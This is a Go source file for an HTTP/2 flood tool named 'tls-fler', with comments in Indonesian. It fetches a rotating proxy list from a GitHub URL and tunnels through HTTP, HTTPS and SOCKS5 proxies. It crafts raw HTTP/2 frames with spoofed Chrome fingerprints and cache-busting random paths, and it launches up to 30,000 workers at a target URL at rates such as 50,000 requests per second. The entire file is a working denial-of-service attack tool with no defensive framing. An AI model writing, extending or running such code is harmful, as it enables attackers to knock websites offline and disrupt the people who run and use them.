package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2/hpack"
	"golang.org/x/net/proxy"
)

// ── consts ────────────────────────────────────────────────────────────────────

const (
	proxyGitURL = "https://raw.githubusercontent.com/malasahjagotwin/restissue/refs/heads/master/proxy/global.txt"
	h2Preface   = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
)

var uaPool = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
}

var secChUaPool = []string{
	`"Chromium";v="136", "Google Chrome";v="136", "Not-A.Brand";v="99"`,
	`"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"`,
	`"Not/A)Brand";v="8", "Chromium";v="136", "Google Chrome";v="136"`,
}

// ── stats ─────────────────────────────────────────────────────────────────────

var (
	totalReq int64
	totalOK  int64
	totalErr int64
)

// ── proxy ─────────────────────────────────────────────────────────────────────

// ProxyType menentukan jenis proxy
type ProxyType int

const (
	ProxyHTTP   ProxyType = iota // host:port:user:pass  atau  http://user:pass@host:port
	ProxyHTTPS                   // https://user:pass@host:port
	ProxySOCKS5                  // socks5://user:pass@host:port
)

type Proxy struct {
	ptype        ProxyType
	host, port   string
	user, pass   string
}

// parseProxyLine mendukung format:
//   host:port
//   host:port:user:pass
//   http://host:port
//   http://user:pass@host:port
//   https://user:pass@host:port
//   socks5://user:pass@host:port
func parseProxyLine(line string) (Proxy, bool) {
	line = strings.TrimSpace(line)
	if line == "" {
		return Proxy{}, false
	}

	var p Proxy

	if strings.HasPrefix(line, "socks5://") {
		p.ptype = ProxySOCKS5
		u, err := url.Parse(line)
		if err != nil {
			return Proxy{}, false
		}
		p.host = u.Hostname()
		p.port = u.Port()
		if u.User != nil {
			p.user = u.User.Username()
			p.pass, _ = u.User.Password()
		}
		return p, true
	}

	if strings.HasPrefix(line, "https://") {
		p.ptype = ProxyHTTPS
		u, err := url.Parse(line)
		if err != nil {
			return Proxy{}, false
		}
		p.host = u.Hostname()
		p.port = u.Port()
		if p.port == "" {
			p.port = "443"
		}
		if u.User != nil {
			p.user = u.User.Username()
			p.pass, _ = u.User.Password()
		}
		return p, true
	}

	if strings.HasPrefix(line, "http://") {
		p.ptype = ProxyHTTP
		u, err := url.Parse(line)
		if err != nil {
			return Proxy{}, false
		}
		p.host = u.Hostname()
		p.port = u.Port()
		if p.port == "" {
			p.port = "80"
		}
		if u.User != nil {
			p.user = u.User.Username()
			p.pass, _ = u.User.Password()
		}
		return p, true
	}

	// plain format: host:port  atau  host:port:user:pass
	parts := strings.Split(line, ":")
	if len(parts) < 2 {
		return Proxy{}, false
	}
	p.ptype = ProxyHTTP
	p.host = parts[0]
	p.port = parts[1]
	if len(parts) >= 4 {
		p.user = parts[2]
		p.pass = parts[3]
	}
	return p, true
}

type ProxyPool struct {
	mu   sync.RWMutex
	list []Proxy
	hash string
}

func loadProxies(r io.Reader) []Proxy {
	var out []Proxy
	sc := bufio.NewScanner(r)
	for sc.Scan() {
		if p, ok := parseProxyLine(sc.Text()); ok {
			out = append(out, p)
		}
	}
	return out
}

func proxyHash(list []Proxy) string {
	s := make([]string, len(list))
	for i, p := range list {
		s[i] = p.host + p.port
	}
	return strings.Join(s, ",")
}

func NewProxyPool(localPath string) (*ProxyPool, error) {
	pp := &ProxyPool{}

	// try GitHub first
	resp, err := http.Get(proxyGitURL)
	if err == nil && resp.StatusCode == 200 {
		list := loadProxies(resp.Body)
		resp.Body.Close()
		if len(list) > 0 {
			pp.list = list
			pp.hash = proxyHash(list)
			writeProxyFile(localPath, list)
			fmt.Printf("[proxy] %d proxies loaded from GitHub\n", len(list))
			return pp, nil
		}
	}

	// fallback local
	f, err2 := os.Open(localPath)
	if err2 != nil {
		return nil, fmt.Errorf("no proxies available (github: %v, local: %v)", err, err2)
	}
	defer f.Close()
	list := loadProxies(f)
	if len(list) == 0 {
		return nil, fmt.Errorf("proxy file is empty: %s", localPath)
	}
	pp.list = list
	pp.hash = proxyHash(list)
	fmt.Printf("[proxy] %d proxies loaded from %s\n", len(list), localPath)
	return pp, nil
}

func writeProxyFile(path string, list []Proxy) {
	f, err := os.Create(path)
	if err != nil {
		return
	}
	defer f.Close()
	for _, p := range list {
		switch p.ptype {
		case ProxySOCKS5:
			if p.user != "" {
				fmt.Fprintf(f, "socks5://%s:%s@%s:%s\n", p.user, p.pass, p.host, p.port)
			} else {
				fmt.Fprintf(f, "socks5://%s:%s\n", p.host, p.port)
			}
		case ProxyHTTPS:
			if p.user != "" {
				fmt.Fprintf(f, "https://%s:%s@%s:%s\n", p.user, p.pass, p.host, p.port)
			} else {
				fmt.Fprintf(f, "https://%s:%s\n", p.host, p.port)
			}
		default:
			if p.user != "" {
				fmt.Fprintf(f, "%s:%s:%s:%s\n", p.host, p.port, p.user, p.pass)
			} else {
				fmt.Fprintf(f, "%s:%s\n", p.host, p.port)
			}
		}
	}
}

func (pp *ProxyPool) AutoUpdate(localPath string) {
	t := time.NewTicker(30 * time.Second)
	for range t.C {
		resp, err := http.Get(proxyGitURL)
		if err != nil || resp.StatusCode != 200 {
			continue
		}
		list := loadProxies(resp.Body)
		resp.Body.Close()
		if len(list) == 0 {
			continue
		}
		h := proxyHash(list)
		pp.mu.Lock()
		if h != pp.hash {
			pp.list = list
			pp.hash = h
			writeProxyFile(localPath, list)
			fmt.Printf("[proxy] updated → %d proxies\n", len(list))
		}
		pp.mu.Unlock()
	}
}

func (pp *ProxyPool) Pick() Proxy {
	pp.mu.RLock()
	defer pp.mu.RUnlock()
	return pp.list[rand.Intn(len(pp.list))]
}

func (pp *ProxyPool) Len() int {
	pp.mu.RLock()
	defer pp.mu.RUnlock()
	return len(pp.list)
}

// ── dial: proxy → TLS/h2 ─────────────────────────────────────────────────────

func dialH2(px Proxy, targetHost string, targetPort int) (net.Conn, error) {
	var rawConn net.Conn
	var err error

	switch px.ptype {

	case ProxySOCKS5:
		// SOCKS5 via golang.org/x/net/proxy
		var auth *proxy.Auth
		if px.user != "" {
			auth = &proxy.Auth{User: px.user, Password: px.pass}
		}
		dialer, err2 := proxy.SOCKS5("tcp", net.JoinHostPort(px.host, px.port), auth, &net.Dialer{Timeout: 10 * time.Second})
		if err2 != nil {
			return nil, fmt.Errorf("socks5 dialer: %w", err2)
		}
		rawConn, err = dialer.Dial("tcp", fmt.Sprintf("%s:%d", targetHost, targetPort))
		if err != nil {
			return nil, fmt.Errorf("socks5 dial: %w", err)
		}

	case ProxyHTTPS:
		// HTTPS proxy: TLS ke proxy dulu, lalu CONNECT tunnel
		proxyAddr := net.JoinHostPort(px.host, px.port)
		tcpConn, err2 := net.DialTimeout("tcp", proxyAddr, 10*time.Second)
		if err2 != nil {
			return nil, fmt.Errorf("https proxy tcp dial: %w", err2)
		}
		// TLS ke proxy
		proxyTLS := tls.Client(tcpConn, &tls.Config{
			ServerName:         px.host,
			InsecureSkipVerify: true,
		})
		proxyTLS.SetDeadline(time.Now().Add(10 * time.Second))
		if err2 := proxyTLS.Handshake(); err2 != nil {
			proxyTLS.Close()
			return nil, fmt.Errorf("https proxy tls handshake: %w", err2)
		}
		proxyTLS.SetDeadline(time.Time{})
		rawConn = proxyTLS
		// kirim CONNECT
		if err2 := sendCONNECT(rawConn, px, targetHost, targetPort); err2 != nil {
			rawConn.Close()
			return nil, err2
		}

	default: // ProxyHTTP
		// plain TCP ke proxy, lalu CONNECT tunnel
		proxyAddr := net.JoinHostPort(px.host, px.port)
		rawConn, err = net.DialTimeout("tcp", proxyAddr, 10*time.Second)
		if err != nil {
			return nil, fmt.Errorf("http proxy dial: %w", err)
		}
		if err2 := sendCONNECT(rawConn, px, targetHost, targetPort); err2 != nil {
			rawConn.Close()
			return nil, err2
		}
	}

	// TLS handshake dengan ALPN h2 ke target
	tlsCfg := &tls.Config{
		ServerName:         targetHost,
		InsecureSkipVerify: true,
		NextProtos:         []string{"h2"},
		MinVersion:         tls.VersionTLS12,
		CurvePreferences:   []tls.CurveID{tls.X25519, tls.CurveP256},
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
		},
	}
	tlsConn := tls.Client(rawConn, tlsCfg)
	tlsConn.SetDeadline(time.Now().Add(10 * time.Second))
	if err := tlsConn.Handshake(); err != nil {
		tlsConn.Close()
		return nil, fmt.Errorf("target TLS handshake: %w", err)
	}
	if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
		tlsConn.Close()
		return nil, fmt.Errorf("h2 not negotiated")
	}
	tlsConn.SetDeadline(time.Time{})
	return tlsConn, nil
}

// sendCONNECT kirim HTTP CONNECT dan tunggu 200
func sendCONNECT(conn net.Conn, px Proxy, targetHost string, targetPort int) error {
	var buf bytes.Buffer
	fmt.Fprintf(&buf, "CONNECT %s:%d HTTP/1.1\r\n", targetHost, targetPort)
	fmt.Fprintf(&buf, "Host: %s:%d\r\n", targetHost, targetPort)
	if px.user != "" {
		creds := base64.StdEncoding.EncodeToString([]byte(px.user + ":" + px.pass))
		fmt.Fprintf(&buf, "Proxy-Authorization: Basic %s\r\n", creds)
	}
	fmt.Fprintf(&buf, "Proxy-Connection: Keep-Alive\r\n\r\n")

	conn.SetDeadline(time.Now().Add(10 * time.Second))
	if _, err := conn.Write(buf.Bytes()); err != nil {
		return fmt.Errorf("CONNECT write: %w", err)
	}

	resp, err := http.ReadResponse(bufio.NewReader(conn), nil)
	if err != nil {
		return fmt.Errorf("CONNECT response: %w", err)
	}
	resp.Body.Close()
	if resp.StatusCode != 200 {
		return fmt.Errorf("CONNECT rejected: %s", resp.Status)
	}
	conn.SetDeadline(time.Time{})
	return nil
}

// ── HTTP/2 raw frame helpers ──────────────────────────────────────────────────

func encFrame(streamID uint32, ftype, flags uint8, payload []byte) []byte {
	l := len(payload)
	out := make([]byte, 9+l)
	out[0] = byte(l >> 16)
	out[1] = byte(l >> 8)
	out[2] = byte(l)
	out[3] = ftype
	out[4] = flags
	binary.BigEndian.PutUint32(out[5:], streamID&0x7FFFFFFF)
	copy(out[9:], payload)
	return out
}

func settingsBytes() []byte {
	pairs := [][2]uint32{
		{0x1, 65536},
		{0x2, 0},
		{0x4, 6291456},
		{0x6, 262144},
	}
	b := make([]byte, 6*len(pairs))
	for i, p := range pairs {
		binary.BigEndian.PutUint16(b[i*6:], uint16(p[0]))
		binary.BigEndian.PutUint32(b[i*6+2:], p[1])
	}
	return b
}

func winUpdate(n uint32) []byte {
	b := make([]byte, 4)
	binary.BigEndian.PutUint32(b, n)
	return b
}

// ── path builder ──────────────────────────────────────────────────────────────

func randStr(n int) string {
	const chars = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return string(b)
}

func buildPath(u *url.URL) string {
	p := u.Path
	if p == "" {
		p = "/"
	}
	for strings.Contains(p, "%RAND%") {
		p = strings.Replace(p, "%RAND%", randStr(rand.Intn(10)+6), 1)
	}
	q := randStr(rand.Intn(6)+4) + "=" + randStr(rand.Intn(8)+4)
	if strings.Contains(p, "?") {
		return p + "&" + q
	}
	return p + "?" + q
}

// ── HTTP/2 session ────────────────────────────────────────────────────────────

func runSession(conn net.Conn, u *url.URL, rps int, deadline time.Time) {
	defer conn.Close()

	// client preface
	preface := []byte(h2Preface)
	preface = append(preface, encFrame(0, 0x4, 0, settingsBytes())...)
	preface = append(preface, encFrame(0, 0x8, 0, winUpdate(15663105))...)
	if _, err := conn.Write(preface); err != nil {
		return
	}

	// reader goroutine
	go func() {
		br := bufio.NewReaderSize(conn, 64*1024)
		hdr := make([]byte, 9)
		dec := hpack.NewDecoder(4096, nil)
		for {
			if _, err := io.ReadFull(br, hdr); err != nil {
				return
			}
			plen := int(hdr[0])<<16 | int(hdr[1])<<8 | int(hdr[2])
			ftype := hdr[3]
			flags := hdr[4]
			var payload []byte
			if plen > 0 {
				payload = make([]byte, plen)
				if _, err := io.ReadFull(br, payload); err != nil {
					return
				}
			}
			switch ftype {
			case 0x4: // SETTINGS
				if flags&0x1 == 0 {
					conn.Write(encFrame(0, 0x4, 0x1, nil))
				}
			case 0x6: // PING
				conn.Write(encFrame(0, 0x6, 0x1, payload))
			case 0x7: // GOAWAY
				conn.Close()
				return
			case 0x1: // HEADERS
				hdrs, err := dec.DecodeFull(payload)
				if err != nil {
					continue
				}
				for _, h := range hdrs {
					if h.Name == ":status" {
						code, _ := strconv.Atoi(h.Value)
						if code >= 200 && code < 500 {
							atomic.AddInt64(&totalOK, 1)
						} else {
							atomic.AddInt64(&totalErr, 1)
						}
					}
				}
			}
		}
	}()

	// writer
	var interval time.Duration
	if rps > 0 {
		interval = time.Second / time.Duration(rps)
	}

	streamID := uint32(1)
	var hpackBuf bytes.Buffer
	enc := hpack.NewEncoder(&hpackBuf)

	for time.Now().Before(deadline) {
		ua := uaPool[rand.Intn(len(uaPool))]
		secChUa := secChUaPool[rand.Intn(len(secChUaPool))]
		isMobile := rand.Intn(100) < 35
		mobileVal, platformVal := "?0", `"Windows"`
		if isMobile {
			mobileVal, platformVal = "?1", `"Android"`
		}
		cacheCtrl := "no-cache"
		if rand.Intn(2) == 0 {
			cacheCtrl = "max-age=0"
		}

		hpackBuf.Reset()
		for _, f := range []hpack.HeaderField{
			{Name: ":method", Value: "GET"},
			{Name: ":authority", Value: u.Hostname()},
			{Name: ":scheme", Value: "https"},
			{Name: ":path", Value: buildPath(u)},
			{Name: "cache-control", Value: cacheCtrl},
			{Name: "sec-ch-ua", Value: secChUa},
			{Name: "sec-ch-ua-mobile", Value: mobileVal},
			{Name: "sec-ch-ua-platform", Value: platformVal},
			{Name: "upgrade-insecure-requests", Value: "1"},
			{Name: "user-agent", Value: ua},
			{Name: "accept", Value: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"},
			{Name: "sec-fetch-site", Value: "none"},
			{Name: "sec-fetch-mode", Value: "navigate"},
			{Name: "sec-fetch-user", Value: "?1"},
			{Name: "sec-fetch-dest", Value: "document"},
			{Name: "accept-encoding", Value: "gzip, deflate, br, zstd"},
			{Name: "accept-language", Value: "en-US,en;q=0.9"},
			{Name: "priority", Value: "u=0, i"},
		} {
			enc.WriteField(f)
		}

		encoded := hpackBuf.Bytes()
		payload := make([]byte, 5+len(encoded))
		payload[0] = 0x80
		payload[4] = 0xFF
		copy(payload[5:], encoded)

		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		if _, err := conn.Write(encFrame(streamID, 0x1, 0x25, payload)); err != nil {
			return
		}
		atomic.AddInt64(&totalReq, 1)
		streamID += 2

		if interval > 0 {
			time.Sleep(interval)
		}
	}
}

// ── worker ────────────────────────────────────────────────────────────────────

func worker(pool *ProxyPool, u *url.URL, port, rps int, deadline time.Time, wg *sync.WaitGroup) {
	defer wg.Done()
	for time.Now().Before(deadline) {
		px := pool.Pick()
		conn, err := dialH2(px, u.Hostname(), port)
		if err != nil {
			atomic.AddInt64(&totalErr, 1)
			continue
		}
		runSession(conn, u, rps, deadline)
	}
}

// ── main ──────────────────────────────────────────────────────────────────────

func main() {
	if len(os.Args) < 4 {
		fmt.Fprintf(os.Stderr, "Usage: %s <url> <duration_sec> <rate_per_sec> [proxy_file]\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "Example:\n")
		fmt.Fprintf(os.Stderr, "  ./tls-fler https://example.com 60 50000\n")
		fmt.Fprintf(os.Stderr, "  ./tls-fler https://example.com/%%RAND%% 60 50000 proxy/global.txt\n\n")
		fmt.Fprintf(os.Stderr, "Proxy formats supported in proxy file:\n")
		fmt.Fprintf(os.Stderr, "  host:port                        (HTTP)\n")
		fmt.Fprintf(os.Stderr, "  host:port:user:pass              (HTTP + auth)\n")
		fmt.Fprintf(os.Stderr, "  http://user:pass@host:port       (HTTP + auth)\n")
		fmt.Fprintf(os.Stderr, "  https://user:pass@host:port      (HTTPS)\n")
		fmt.Fprintf(os.Stderr, "  socks5://user:pass@host:port     (SOCKS5)\n")
		os.Exit(1)
	}

	targetRaw := os.Args[1]
	duration, err := strconv.Atoi(os.Args[2])
	if err != nil || duration <= 0 {
		fmt.Fprintln(os.Stderr, "error: duration must be positive integer")
		os.Exit(1)
	}
	rate, err := strconv.Atoi(os.Args[3])
	if err != nil || rate <= 0 {
		fmt.Fprintln(os.Stderr, "error: rate must be positive integer")
		os.Exit(1)
	}
	proxyFile := "proxy/global.txt"
	if len(os.Args) >= 5 {
		proxyFile = os.Args[4]
	}

	u, err := url.Parse(targetRaw)
	if err != nil {
		fmt.Fprintf(os.Stderr, "error: invalid url: %v\n", err)
		os.Exit(1)
	}

	pool, err := NewProxyPool(proxyFile)
	if err != nil {
		fmt.Fprintf(os.Stderr, "error: %v\n", err)
		os.Exit(1)
	}
	go pool.AutoUpdate(proxyFile)

	port := 443
	if p := u.Port(); p != "" {
		port, _ = strconv.Atoi(p)
	}

	runtime.GOMAXPROCS(runtime.NumCPU())

	rpsPerConn := 128
	workers := rate / rpsPerConn
	if workers < 1 {
		workers = 1
	}
	if workers > 30000 {
		workers = 30000
	}
	rpsPerWorker := rate / workers
	if rpsPerWorker < 1 {
		rpsPerWorker = 1
	}

	deadline := time.Now().Add(time.Duration(duration) * time.Second)

	fmt.Printf("[tls-fler] %s | %ds | %d req/s | %d workers | %d proxies\n",
		u.Hostname(), duration, rate, workers, pool.Len())

	start := time.Now()
	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go worker(pool, u, port, rpsPerWorker, deadline, &wg)
	}

	// live stats setiap 5 detik
	go func() {
		t := time.NewTicker(5 * time.Second)
		var lastReq int64
		for range t.C {
			cur := atomic.LoadInt64(&totalReq)
			rps := (cur - lastReq) / 5
			lastReq = cur
			fmt.Printf("[stats] req=%d ok=%d err=%d rps=%d\n",
				cur, atomic.LoadInt64(&totalOK), atomic.LoadInt64(&totalErr), rps)
		}
	}()

	wg.Wait()

	elapsed := time.Since(start).Seconds()
	fmt.Println("\n========== SUMMARY ==========")
	fmt.Printf("Target   : %s\n", u)
	fmt.Printf("Duration : %.2fs\n", elapsed)
	fmt.Printf("Total    : %d\n", totalReq)
	fmt.Printf("OK       : %d\n", totalOK)
	fmt.Printf("Error    : %d\n", totalErr)
	fmt.Printf("Avg RPS  : %.0f\n", float64(totalReq)/elapsed)
	fmt.Println("=============================")
}
